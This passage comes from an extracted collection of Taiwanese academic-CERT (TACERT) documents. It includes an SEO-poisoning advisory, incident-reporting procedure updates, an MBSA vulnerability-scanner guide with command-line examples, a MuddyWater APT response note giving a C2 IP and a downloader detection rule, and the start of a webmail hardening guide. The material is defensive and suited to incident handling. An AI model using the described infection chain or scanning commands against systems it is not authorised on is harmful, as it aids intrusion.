        "content": "教育網路中心 21 金門縣教育網路中心 22 連江縣教育網路中心 23 中央研究院 24 臺北區域網路中心(1) 25 臺北區域網路中心(2) 26 桃園區域網路中心 27 竹苗區域網路中心 28 新竹區域網路中心 29 臺中區域網路中心 30 南投區域網路中心 31 雲嘉區域網路中心 32 臺南區域網路中心 33 高屏澎區域網路中心 34 宜蘭區域網路中心 35 花蓮區域網路中心 36 臺東區域網路中心  16 附件二 臺灣學術網路之各單位資通安全事件通報單 ",
        "Page_Num": "16,17"
    },
    "20": {
        "File_Name": "GoogleSearch.pdf",
        "content": "1 Google 搜尋結果出現不當文字及惡意連結之補充說明 一、 事件說明 接獲學校反應使用Google 搜尋指令查詢「site:網站網址(如 example.edu.tw)”投資” “當沖”」或使用「site:網站網址(如 example.edu.tw)」查詢,所顯示的搜尋結果頁內容發現有大量 不相關或不當的資訊。在排除網站遭到入侵或被不當更改的 情況下,可能為遭受SEO 中毒攻擊(SEO Poisoning)所導致。 二、 識別SEO 中毒攻擊 網站管理者可使用Google Search 語法「Site:網站網址」查 詢所管理的網站是否存在搜尋結果異常,如下圖所示。 三、 防護作為建議 1. 確認該網站是否遭到入侵或被置入惡意程式。請特別確認該 網站網頁內容是否有類似不當連結或有相關轉址的指令,以 避免被不當轉址至其它惡意網頁。例如: HTML 網頁中的 <header>區段被置入惡意轉址指令,導致使用瀏覽器會被轉 址到惡意網頁。 2. 建議網站管理者至Google Search Console 服務申請管理帳 號,這是Google 提供的一項免費服務,能夠協助您監控及 維持網站在Google 搜尋結果中的排名,並排解相關問題。 (請參考附錄一)  2 3. 如確認已遭到SEO 中毒攻擊(SEO Poisoning),即可至 Google Search Console 服務申請「移除網址」以避免被他人 查詢到錯誤的資訊。(請參考附錄二) 4. 在符合單位政策的情況下,可在robots.txt 加上不允許搜尋 引擎檢索站內搜尋結果之指令,也可在站內每個搜尋結果加 上<meta noindex>,來避免被搜尋引擎所檢索。(提醒:若單位 在robots.txt 設定,可能造成學校於Google 上檢索不到,降 低學校被搜尋的可能性)。 附錄一:Google Search Console 服務申請 1. 網站管理者至 Google Search Console 服務( 網址: https://search.google.com/u/1/search-console/)申請管理帳號。 圖1. Google Search Console 申請頁面 2. 請輸入網域資訊,接著即會繼續如圖2 的驗證",
        "Page_Num": "1,2"
    },
    "21": {
        "File_Name": "GoogleSearch.pdf",
        "content": "程序,請下載該認 證檔,並上傳至網站(通常為網站根目錄(Documentroot))。  3 圖2. Google Search Console 驗證程序 3. 在上傳完成後,即可完成驗證所有權,如圖3 所示。 圖3. 驗證成功訊息 附錄二:申請移除網址 1. 網站管理者登入Google Search Console 服務後,先點選「移除網 址」,再點選「新要求」後,即可輸入要清除的網址等資訊,待 Google 作業完成後,即可清除相關資訊。  4 在google 完成作業後,如下圖示 使用者可再次利用google 搜尋語法(site:網站網址)來確認相關資 訊是否已被移除,如下圖示  5 ",
        "Page_Num": "2,3,4,5"
    },
    "22": {
        "File_Name": "info-20190902.pdf",
        "content": "教育機構資安通報平台 通報應變流程修正說明 1 前言 • 資通安全管理法經立法院於107年5月三讀 通過後,行政院對外公告於108年1月1日施 行。 • 為符合資通安全管理法相關規定,TACERT 團隊執行「教育機構資安通報平台」內容 相關修正。 • 下列將針對相關修正項目進行說明  修正重點 • 於通報流程中新增「確認時間」欄位,以利記錄事件確認時間。 新增「確認時間」 • 於應變流程中新增「改善措施」欄位,以利處理人員填寫事件改善措施。 新增「改善措施」 • 於事件通報應變完成後,於「歷史通報」中新增「事件列印」功能,以 利處理人員列印事件內容送呈單位主管 新增「事件列印」 • 此次修正項目預計於108年09月01日(日)上線,上線後依據相關修正進行 通報應變作業。 修正時程 修正依據 • 依據資通安全管理法之資通安全事件通報及應變辦法第二章第 四條規定: - 公務機關知悉資通安全事件後,應於一小時內依主管機關指定 之方式及對象,進行資通安全事件之通報 • 依據資通安全法之資通安全事件通報及應變辦法第三章第十一 條規定: - 特定非公務機關知悉資通安全事件後,應於一小時內依中央目 的事業主管機關指定之方式,進行資通安全事件之通報 資通安全事件通報及應變辦法 • 依據臺灣學術網路各級學校資通安全通報應變作業程序第三章 第一節第二條規定: - 各連線單位發現資安事件後可先進行事件確認,經確認為資安 事件後,須於一小時內,至通報應變網站通報登錄資安事件細 節、影響等級及是否申請支援等資訊,並評估該事件是否影響 其他連線單位運作。 臺灣學術網路各級學校資通安全通報應變作業程序  相關修正說明 確認時間修正說明 新增「確認時間」 • 於現行通報流程填寫欄位新增「確認時間」欄位 • 確認時間指各連線單位發現",
        "Page_Num": "1,2,3"
    },
    "23": {
        "File_Name": "info-20190902.pdf",
        "content": "資安事件後可先進行 事件確認,經確認資安事件條件成立之時間 • 事件通報流程需於確認時間後1小時內完成 • 事件通報應變時效不因新增確認時間而改變, 「1」、「2」級事件需於72小時內完成; 「3」、「4」級事件需於36小時內完成。  現行通報應變時程 事件發生 時間 事件發佈 時間 通報完成 時間 應變完成 時間 通報時間 (通報完成時間- 事件發佈時間) 應變時間 (應變完成時間- 通報完成時間) 事件處理時間 修正後通報應變時程 事件發生 時間 事件發佈 時間 事件確認 時間 通報完成 時間 應變完成 時間 通報時間 (於1小時內) 應變時間 事件處理時間 確認時間  確認時間畫面 提示訊息 改善措施修正說明 新增「改善措施」 • 於現行應變流程填寫欄位新增「改善措施」 欄位 • 改善措施指各連線單位於完成通報應變後, 針對事件發生提出相關改善措施,以完備事 件處理流程及預防事件重覆發生 • 改善措施包含「改善辦法」及「改善時間」 欄位  改善措施畫面 事件列印修正說明 新增「事件列印」 • 依據臺灣學術網路各級學校資通安全通報應變作業 程序第三章第一節第六條規定: - 「2」、「1」級資安事件通報應變完成後,應至通 報應變網站列印單件,每月彙整送呈單位主管; 「4」、「3」級資安事件需於事件發生後36小時內, 通報送陳單位資通安全長。 • 於登入「教育機構資安通報平台」後,左側「歷史 通報」中即可套表列印貴單位事件單以利送呈簽核  事件列印畫面 事件列印畫面  事件列印畫面 套表簽核欄位 重點整理 新增「確認時間」並於事件確認後一小時內完成 通報流程 新增「改善措施」以完備事件處理流程 新增「事件列印」以利送呈簽核 修正項目於108年09月01日(日)上線  重點",
        "Page_Num": "3,4,5,6,7,8,9"
    },
    "24": {
        "File_Name": "info-20190902.pdf",
        "content": "提醒 因應「資通安全管理法」及其相關辦法 與「臺灣學術網路各級學校資通安全通 報應變作業程序」進行相關修正作業 各單位務必掌握時效依照相關規定完成 通報應變作業,以避免相關刑事、民事 及行政相關責任。 ",
        "Page_Num": "9"
    },
    "25": {
        "File_Name": "infocheck.pdf",
        "content": "臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 資安通報平台審核檢查說明 在審核單位在經過有效且嚴謹的審視資安通報單的內容後,即可勾 選「已確認通報應變內容正確性」的選項。 ",
        "Page_Num": "1"
    },
    "26": {
        "File_Name": "infoother.pdf",
        "content": "臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 資安通報平台新增資安事件分類說明 随著資安事件類型的多樣化,資安通報平台事件分類除了原 有的「INT(入侵攻擊)」以及「DEF(網頁攻擊)」以外,新增 OTHER(其它事件)類別,其事件類型包含:「設備故障/毀損」、 「電力異常」、「網路服務中斷」、「設備遺失」等,事件分類 功能截圖如圖1 所示,以便能更貼切實際之資安事件類型。 圖1.事件分類新增OTHER(其它事件)類型截圖 ",
        "Page_Num": "1"
    },
    "27": {
        "File_Name": "inforeport.pdf",
        "content": "臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 重大資安通報三級(含以上)之注意事項 請單位以目前已有之確切證據,依據資通安全事件通報及應變辦法[第二條]之 規定(如表1 所示),進行適當等級之通報。重大資安事件通報應變流程請參 閱附件1 及附件2。 表1. 資安事件等級綜合評估表 機密性 資訊洩漏 完整性 資訊/資通系統遭竄改 可用性 業務/資通系統運作遭中斷 等 級 資訊性質 影響 程度 業務資訊/ 資通系統 影響 程度 業務 可否於可容忍 中斷時間回復 1 級 非核心業務 輕微 非核心 輕微 非核心業務 可 2 級 非核心業務 嚴重 非核心 嚴重 非核心業務 不可 核心業務 (未涉及CI 維 運) 輕微 核心 (未涉及CI 維 運) 輕微 核心/資通系統 (未涉及CI 維 運) 可 3 級 核心業務 (未涉及CI 維 運) 嚴重 核心業務 (未涉及CI 維 運) 嚴重 核心/資通系統 (未涉及CI 維 運) 不可 核心業務 (涉及CI 維運) 輕微 核心 (涉及CI 維運) 輕微 核心/資通系統 (涉及CI 維運) 可 一般公務機密、 敏感資訊 輕微 一般公務機密、 敏感資訊 輕微 - - 4 級 核心業務 (涉及CI 維運) 嚴重 核心業務 (涉及CI 維運) 嚴重 核心/資通系統 (涉及CI 維運) 不可 一般公務機密、 敏感資訊 嚴重 一般公務機密、 敏感資訊 嚴重 - - 國家機密 - 國家機密 - - - *CI 指「關鍵基礎設施(Critical Infrastructure)」 若為重大個資(個人資料)外洩事件,欲通報三級以上之事件,請於確認外洩事 實明確的情況下,進行通報,並於通報單內",
        "Page_Num": "1"
    },
    "28": {
        "File_Name": "inforeport.pdf",
        "content": "說明下列事項: 1. 確定洩漏筆數 (如約100 筆個資) 2. 確定洩漏資訊欄位 (如姓名,地址,身份證字號等資訊) 3. 確定外洩管道 (如人為疏失等) 4. 遭受揭露個資之儲存媒體(如網站,資料庫等) 此外,請依個人資料保護法(第12條)及個人資料保護法施行細則(第22 條)進行個資外洩公告 (指以「適當方式」使當事人知悉)。  臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 單位於確認三級(含)以上事件成立後,在損害控管完成後,依資通安全事件 通報及應變辦法之規範,事發機關應於1個月內提交相關改善報告(附件三)至 主管機關。 相關文件下載(https://info.cert.tanet.edu.tw/docinfo/infoattach.zip): 附件一:重大資安事件通報應變流程 附件二:教育部及所屬重大資安事件發生單位自我檢核表 附件三:資安事件改善報告(空白格式) ",
        "Page_Num": "1,2"
    },
    "29": {
        "File_Name": "inforeportadd.pdf",
        "content": "1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 資安通報平台新增資安事件通報事項說明 為能更明確了解資安事件發生狀態並與資安標準接軌,教育機構資安 通報平台(https://info.cert.tanet.edu.tw/) 將於通報應變作業中新增說 明欄位資料,新增欄位預計於112 年6 月初正式上線。 一、 通報流程新增「受駭設備類型」、「受害設備說明」、「損害類別說 明」、「攻擊手法」、「調查說明」、「情資類型」欄位資料,如圖1 所示,新增欄位說明如下列: 圖1.通報流程新增的欄位資料 1、 「受駭設備類型」:受駭設備類型的欄位選項如圖2 所示,請 就受害之設備選擇適當之對應類型。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 圖2. 受駭設備類型的欄位選項 2、 「受害設備說明」:請簡略說明此設備之用途。 3、 「損害類別說明」:選項分為「資料外洩」、「資料竄改」、「硬 體損害」、「金錢損失」與「其他」,請依實際狀況選擇適當的 損害類型。 4、 「攻擊手法」:攻擊手法的欄位選項如圖3 所示,請選擇攻擊 者所使用的攻擊手法類型。 圖3. 攻擊手法的欄位選項 5、 「調查說明」:請簡略的說明,相關事件的調查結果。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6、 「情資類型」:此資訊為事件原始情資來源之資訊類型,共可 分為下列10 項類型,請選擇適當之類型。 (1). 惡意內容:針對透過文字、照片、影片等形式散播不當內 容之事件。 (2). 惡意程式:針對與相關惡意程式之事件。 (3). 資訊蒐集:針對透過掃描、探測及社交工程等攻擊手法取 得資訊之事件。 (4). 入侵嘗試:針對嘗試入侵未經授權主機之事件。 (5). 入侵攻擊:針對系統遭未經授權存取或取得系統/使用者 權限",
        "Page_Num": "1,2,3"
    },
    "30": {
        "File_Name": "inforeportadd.pdf",
        "content": "之事件。 (6). 阻斷服務:針對影響服務可用性或造成服務中斷之攻擊事 件。 (7). 資訊內容安全:針對系統遭未經驗證存取或影響資訊機敏 性之事件。 (8). 詐欺攻擊:針對偽冒他人身分、系統服務及組織等進行攻 擊行為之事件。 (9). 系統弱點:針對系統存在弱點之事件。 (10). 其他:非屬前述資安事件類型之事件資訊。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 二、 應變流程新增「損害控管狀態」的欄位資料,如圖4 所示。 圖4.應變流程新增的欄位資料 「損害控制狀態」可分為完成下列兩種狀態,請依實際狀況選 擇適合的選項: 1、 損害控制:已控管此事件所造成的危害。 2、 完成損害控制與復原:已控管此事件所造成的危害並已 完成系統復原。 ",
        "Page_Num": "3,4"
    },
    "31": {
        "File_Name": "infotypenote.pdf",
        "content": "資安通報平台威脅情報說明 當收到資安情資後,經適當且有效的系統調查後,並未發現有直接或 間接證據可證明系統遭受到資安事件之威脅即可選擇TII(威脅情報)。 建議您在進行系統調查時進行下列步驟:  檢查系統或網路相關LOG 資訊,查看是否有異常之處。  利用如TCPVIEW 工具軟體或netstat 指令來查看系統是否有開啟 可疑之服務或是否有可疑之來源連線。  查看防火牆之連線記錄,確認是否有可疑之連線。  如果有設置入侵偵測軟體(IDS),進行查看是否有惡意的連線行 為。 ",
        "Page_Num": "1"
    },
    "32": {
        "File_Name": "MBSA使用說明文件.pdf",
        "content": "Microsoft Baseline Security Analyzer 簡介暨使用說明 V1.0 TANet CERT 台灣學術網路危機處理中心團隊 2010/12/8 [此文件主要簡介Microsoft Baseline Security Analyzer 工具,並提供使用說明。]  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 1 目錄 簡介 .............................................................................................. 2 概觀 .............................................................................................. 2 支援作業系統 .............................................................................. 2 檢查項目 ...................................................................................... 3 圖形界面 ...................................................................................... 3 工作畫面 ................................................................................ 3 掃描畫面 ................................................................................ 4 掃描結果 ................................................................................ 5 命令列界面 .................................................................................. 5 使用方式 ................................................................................ 5 說明(Description) .................................................................. 5 參數列表(Parameter List) ..................................................... 6 使用範例(Examples) ............................................................. 7 掃瞄結果 ................................................................................ 8 參考資料 ...................................................................................... 8 補充說明 ...................................................................................... 8  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 2 簡介 Microsoft Baseline Security Analyzer (MBSA) 是一個簡單易用的工具,可協助中 小型企業判斷其安全性狀態是否符合 Microsoft 的安全性建議,並會根據結果提 供具體的矯正指示。使用 MBSA 偵測一般常犯的安全性設定錯誤和電腦系統所 遺漏的安全性更新,以增強您的安全性管理流程。 概觀 為了方便地評估安裝Windows 電腦之安全狀態,微軟提供了免費的Microsoft Baseline Security Analyzer (MBSA)掃描工具。MBSA 包括圖型和命令列界面,可 以進行本地或遠程掃描微軟Windows 系統。 MBSA 運行在Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Visat, Windows Server 2003, Windows XP 和Windows 2000 系統上時,將 使用微軟更新的技術掃描缺少的安全更新(security updates)和匯整服務包(rollups and service packs)。 MBSA 將同時掃描常見的安全錯誤(也稱為漏洞評估檢查)使用一個己知的列表 列出所有版本的Windows 安全設定和組態, Internet Information Server (IIS) 5.0, 6.0 and 6.1",
        "Page_Num": "1,2,3"
    },
    "33": {
        "File_Name": "MBSA使用說明文件.pdf",
        "content": ", SQL Server 2000 and 2005, Internet Explorer (IE) 5.01 and later, and Office 2000, 2002 and 2003。 支援作業系統 . Windows Server 2008 R2 . Windows 7 . Windows Server 2008 . Windows Vista . Windows Server 2003 . Windows XP . Windows 2000  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 3 檢查項目 . 安全更新(security updates) . 匯整服務包(rollups and service packs) . 系統安全設定和組態 . Internet Information Server (IIS) 5.0, 6.0 and 6.1 . SQL Server 2000 and 2005 . Internet Explorer (IE) 5.01 and later . Office 2000, 2002 and 2003 圖形界面 工作畫面 功能說明 . Scan a computer – 掃描本機電腦 . Scan multiple computer – 掃描多台電腦 . View existing security scan reports – 檢視現存的安全掃描報告  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 4 掃描畫面 選項說明 . Check for Windows administrative vulnerabilities – 檢查Windows 管理漏洞 . Check for weak password – 密碼強度檢查 . Check for IIS administrative vulnerabilities – 檢查IIS 管理漏洞 . Check for SQL administrative vulnerabilities – 檢查SQL 管理漏洞 . Check for security updates – 檢查安全更新 . Configure computers for Microsoft Update and scanning prerequisites – 微軟更新 和掃描先決條件之電腦設定 . Advanced Update Service Options – 進階更新服務選項 . Scan using assigned Windows Server Update Services(WSUS) Servers only – 掃 描只使用指定的Windows Server Update Services(WSUS)伺服器 .Scan using Microsoft Update only – 掃描只使用Microsoft Update。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 5 掃描結果 命令列界面 Microsoft Baseline Security Analyzer Version 2.1.1 (2.1.2112.0) (C) Copyright 2002-2009 Microsoft Corporation. All rights reserved. 使用方式 使用前於命令列模式下,先行切換到安裝目錄下(C:\\Program Files\\Microsoft Baseline Security Analyzer 2) MBSACLI [/target | /r | /d domain] [/n option] [/o file] [/qp] [/qe]",
        "Page_Num": "3,4,5,6"
    },
    "34": {
        "File_Name": "MBSA使用說明文件.pdf",
        "content": "[/qr] [/qt] [/listfile file] [/xmlout] [/wa | /wi] [/catalog file] [/nvc] [/ia] [/mu] [/nd] [/rd directory] [/?] MBSACLI [/l] [/ls] [/lr file] [/ld file] [/unicode] [/nvc] [/?] 說明(Description) This is a command line interface for Microsoft Baseline Security Analyzer。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 6 參數列表(Parameter List) 參 數 使 用 方 式 說 明 /target domain\\computer Scan named computer. /target IP Scan named IP address. /r IP-IP Scan named IP addresses range. /listfile File Scan named IP address or computer listed in the specified file. /d Domain Scan named domain (use NetBIOS compatible domain name (Ex:MyDomain) instead of Fully Qualified Domain Name(Ex:Mydomain.com)). /n Option Select which scans to NOT perform.Allchecks are performed by default. Valid values:”OS”, “SQL”, “IIS”, “Updates”, “Password”, Can be concatenated with “+”(no spaces). /wa Show only updates approved on the WSUS server. /wi Show all updates even if not approved on the WSUS server. /nvc Do not check for a new version of MBSA. /o filename Output XML file name template. Default: %D% - %C% (%T%). /qp Don't display scan progress. /qt Don't display the report by default following a single-computer scan. /qe Don't display error list. /qr Don't display report list. /q Do not display any of the preceding items. /unicode Output Unicode. /u username Scan using the specified username. /p password Scan using the specified password. /catalog filename Specifies the data source that contains the available security update information. /ia Updates the prerequisite Windows Update Agent components during a scan. /mu Configures computers to",
        "Page_Num": "6,7"
    },
    "35": {
        "File_Name": "MBSA使用說明文件.pdf",
        "content": "use the  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 7 Microsoft Update site for scanning. /nd Do not download any files from the Microsoft Web site when scanning. /xmlout Run in updates only mode using only mbsacli.exe and wusscan.dll. Only these switches can be used with this option: /catalog, /wa, /wi, /nvc, /unicode /l List all reports available. /ls List reports from the latest scan. /lr filename Display overview report. /ld filename Display detailed report. /rd directory Save or Retrieve reports from the specified directory. /? Display this help/usage. 執行MBSACLI 且不帶參數將會掃描本機電腦並進行全面檢查和顯示報告於文 字模式(Executing MBSACLI with no parameters scans the local computer for all checksand displays the report in text-mode.) 使用範例(Examples) MBSACLI MBSACLI /n Password+IIS+OS+SQL MBSACLI /d MyDomain MBSACLI /target 200.0.0.1 MBSACLI /r 200.0.0.1-200.0.0.50 MBSACLI /listfile export.txt MBSACLI /ld \"Domain - Computer (03-01-2002 12-00 AM)\" MBSACLI >c:\\results.txt MBSACLI /catalog c:\\wsusscn2.cab /ia /nvc MBSACLI /wa MBSACLI /xmlout /catalog c:\\temp\\wsusscn2.cab /unicode >results.xml MBSACLI /l /rd c:\\scanreports  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 8 掃瞄結果 參考資料 Microsoft Baseline Security Analyzer 2.1 網頁: http://technet.microsoft.com/zh-tw/security/cc184923 Microsoft Baseline Security Analyzer 2.1 下載網址: http://www.microsoft.com/downloads/en/details.aspx?FamilyID=b1e76bbe-71df-41e8 -8b52-c871d012ba78&displaylang=en Microsoft",
        "Page_Num": "7,8,9"
    },
    "36": {
        "File_Name": "MBSA使用說明文件.pdf",
        "content": "Baseline Security Analyzer 2.1 Q&A 網址: http://technet.microsoft.com/zh-tw/security/cc184922 補充說明 文件內容整理自微軟網站,提供英翻中及排版,如有內容任何問題以微軟網站文 件為主,特此告知。 ",
        "Page_Num": "9"
    },
    "37": {
        "File_Name": "MBSA安裝簡介.pdf",
        "content": "Microsoft Baseline Security Analyzer 安裝簡介 V1.0 [此文件主要說明,如何下載、安裝及使用Microsoft Baseline Security Analyzer 工具。] TANet CERT 台灣學術網路危機處理中心團隊製 2010/12/7  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 1 目錄 一、下載說明 .............................................................. 2 二、安裝說明 .............................................................. 5 三、使用說明 .............................................................. 8 四、補充說明 ............................................................ 11  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 2 一、 下載說明 下載網址:http://technet.microsoft.com/zh-tw/security/cc297183.aspx 選擇安全性更新偵測之Microsoft Baseline Security Analyzer(MBSA) 於Microsoft Baseline Security Analyzer 連結至MBSA 2.1 網頁。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 3 於MBSA 2.1 網頁中點選立即下載連結。 於下載網頁中選擇您所需要的程式版本及語言下載。 目前MBSA 提供四國語言(DE & EN & FR & JA)及二種版本(32 & 64)。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 4 於檔案下載畫面中選擇”儲存”。 範例中將檔案存放於桌面的MBSA 目錄中。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 5 二、 安裝說明 下載完成後,打開目錄,執行下載檔案。 於安全性警告畫面選擇”執行”。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 6 選擇”Next”。 點選”I accept the license agreement”後,選擇”Next”。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 7 選擇安裝目錄後,選擇”Next”。 選擇”Install”進行安裝。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 8 出現此畫面表示安裝完成,選擇”OK”結束安裝程式。 三、 使用說明 安裝完成後於桌面上會出現”Microsoft Baseline Security Analyzer 2.1” 圖示,執行此程式。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 9 於工作畫面選擇”Scan",
        "Page_Num": "1,2,3,4,5,6,7,8,9,10"
    },
    "38": {
        "File_Name": "MBSA安裝簡介.pdf",
        "content": "a computer”,進行本機掃描。 點選”Start Scan”開始本機掃描。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 10 掃描完成後,會產出一份報告。如對報告內容有問題或不知如何解 決,可點選該項目後面之”How to correct this”得到相關訊息。 Administrative Vulnerabilities 掃描結果。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 11 Additional System Information & Internet Information Services(IIS) & Desktop Application Scan 掃描結果。 四、 補充說明 如需掃描多台電腦時,可以工作畫面選擇”Scan multiple computer”。  Taiwan Academic Network Computer Emergency Response Team (TANet CERT) 12 可針對”Domain name” & “IP address range”進行掃描。 PS:使用Scan multiple computer 功能時,需擁有被掃描電腦的帳號及密碼。因 此在無網域環境時無法進行掃描,除非被掃描電腦未設密碼。 ",
        "Page_Num": "10,11,12,13"
    },
    "39": {
        "File_Name": "MuddyWater攻擊事件之應變.pdf",
        "content": "1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team TLP:White MuddyWater 攻擊事件之應變 臺灣學術網路危機處理中心團隊(TACERT)製 2022 年03 月  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、前言 MuddyWater 是最近被美國網路司令部歸入伊朗情報與安全部 (MOIS) 的 APT 組織。111/01 伊朗國家級駭客MuddyWater 針對美國、歐洲、中東和南 亞的電信、政府、石油、國防和金融部門展開了各種攻擊活動。該組織採用 的典型 TTP 是在其感染鏈中大量使用腳本,使用 PowerShell 和 Visual Basic 等語言,以及頻繁使用本地二進製文件 (LoLBins)。在學網中111/2 發 生MuddyWater 攻擊事件共有50 件,其中以大專院校遭受攻擊件數最多。 二、 惡意軟體資訊 NO 項目 內容 1 惡意軟體 名稱 MuddyWater (又稱為TEMP.Zagros、Static Kitten、Seedworm 和 Mercury) 2 偵測規則 MALWARE-OTHER Ps1.Downloader.MuddyWater payload download attempt 3 發動攻擊 之目的 其攻擊目的有三 (1)間諜活動 支持民族國家在中東的政治主導地位,出於民族國家利益的動機。 (2)智慧財產權竊取(資料竊取) 為民族國家帶來經濟優勢。這一目標是通過對私營機構和政府附屬機 構(如大學和研究中心)展開積極的攻擊行動來實現的。 (3)勒索軟體攻擊 它曾試圖在受害者網路上部署諸如滅霸之類的勒索軟體,以破壞其入 侵的證據或破壞私人組織的運作。 4 攻擊特徵 MuddyWater 攻擊事件會連線目的IP:222.231.49.89:80,該IP 為一個 韓國網站。該網址被Virustotal 檢測其惡意比例為0/93,為非惡意網 址。因無法發現目的IP 連線有任何惡意行為與防毒軟體無法檢測出 它的存在,故受害者不易發現受害主機",
        "Page_Num": "1,2"
    },
    "40": {
        "File_Name": "MuddyWater攻擊事件之應變.pdf",
        "content": "有任何異常。從受害主機連線 目的IP:222.231.49.89:80 之封包發現受害主機與目的IP 建立連線後, 有傳輸東西給目的IP。 5 攻擊設備 受害設備有電腦主機與手機。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、 MuddyWater 攻擊手法 以兩種不同的方式進行攻擊。 1. 基於惡意文檔(Maldoc)之感染鏈 通過製作帶有嵌入式按鈕的惡意PDF 檔案來執行的,單擊該按鈕會下載XLS 檔案。XLS 檔案中的惡意VBA 巨集隨後將開始感染過程,並通過產生新的 註冊表項來建立持久性。同時,使用 PowerShell 下載器下載VBScript 以從 C2 獲取主要有效負載(Payload)。 資料來源:本中心參考TALOS 資料整理 (https://blog.talosintelligence.com/2022/01/iranian-apt-muddywater-targets-turkey.html) 2. 基於可執行檔(EXE)之感染鏈 使用特製的 EXE 執行檔而不是 XLS 檔案,但它仍然使用PowerShell 下載 器,並插入新的註冊表項以獲得持久性。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 資料來源:本中心參考TALOS 資料整理 (https://blog.talosintelligence.com/2022/01/iranian-apt-muddywater-targets-turkey.html) 五、建議措施 學校在處理MuddyWater 攻擊事件時,使用對受害主機掃毒方式無法發現 惡意程式所在,而檢視目的IP 網站亦無法看出惡意行為。因此,在處理本 類型資安事件時,有下列處理建議提供學校參考。 1. 向開單單位索取該事件封包來進行分析,以判斷是否有惡意傳輸行為。 2. 在受害設備上執行觀察網路連線之軟體(例如:TCPView),以找出連線目的IP 之惡意程式。 3. 因該類型惡意程式會新增註冊表項目,讓自己於每次開機時啟動,故在移除 惡意程式時,",
        "Page_Num": "2,3,4"
    },
    "41": {
        "File_Name": "MuddyWater攻擊事件之應變.pdf",
        "content": "需先中斷其程式執行後,再進行完整移除。惡意程式移除後, 建議確認開機後背景程式之內容是否仍有其存在。 4. 若學校因網路架構為NAT 架構而無法找到受害設備,則建議學校可先行封鎖 校內IP 對目的IP 之連線,以免重複觸發該類型事件。 ",
        "Page_Num": "4"
    },
    "42": {
        "File_Name": "Open Webmail郵件系統安全管理與防護指南.pdf",
        "content": "Open Webmail 郵件系統 安全管理與防護指南 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年11 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 前言 國內有多所機關學校均建置Open Webmail 系統來提供相關的電子郵件 網路服務,為避免該系統之漏洞導致使用者電子郵件信箱遭駭,本文將說明 Open Webmail 曾被證實的重大安全漏洞,並提供相關的防禦建議,期使能 降低因使用Open Webmail 而造成的安全威脅程度。 由於Open Webmail 相依於郵件伺服器的服務,因此在本文中也會說明 郵件伺服器及主機系統的安全威脅及建議措施,提供多個面向的防護建議。 二、Open Webmail 電子郵件服務系統說明 一般常見的Open Webmail 電子郵件網路服務相關架構如下圖所示,其 中架構圖中的各個角色分別敘述說明如下。 主機系統 郵件伺服器 (MTA) 網站伺服器 Open Webmail(MUA) 1.主機系統 電子郵件網路服務所在主機上所使用的作業系統,例如:Linux 或 Windows 作業系統。 2. MTA (Mail Transfer Agent)  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 郵件傳送代理程式,又可稱為電子郵件伺服器或SMTP(Simple Mail Transfer Protocol)伺服器(在本文中,將簡稱為郵件伺服器),其主要的 功能如下所述: (1) 寄送電子郵件 就如同現實生活中郵局的角色,幫忙寄件者將電子郵件寄送到寄件 者所在的郵件伺服器。 (2) 接收其它郵件伺服器所傳遞過來的電子郵件 當郵件伺服器取得對方所傳遞過來的電子郵件後,即會交由MDA (Mail Deliver Agent,郵遞送代理人)處理,並將所收到的電子郵件投 送到相對應的帳戶下的郵件檔案中 ( 通常為Mailbox 格式或mailDir 格 式)以提供郵件伺服器的使用者取回電子郵件。 目前實務上所常用的郵件伺服器為postfix 及sendmail 郵件伺服器。 3. MUA (Mail User Agent ) 郵件使用代理程式,簡單講就是我們在寄信或收信所使用的收發信軟 體(例如outlook 軟體",
        "Page_Num": "1,2,3"
    },
    "43": {
        "File_Name": "Open Webmail郵件系統安全管理與防護指南.pdf",
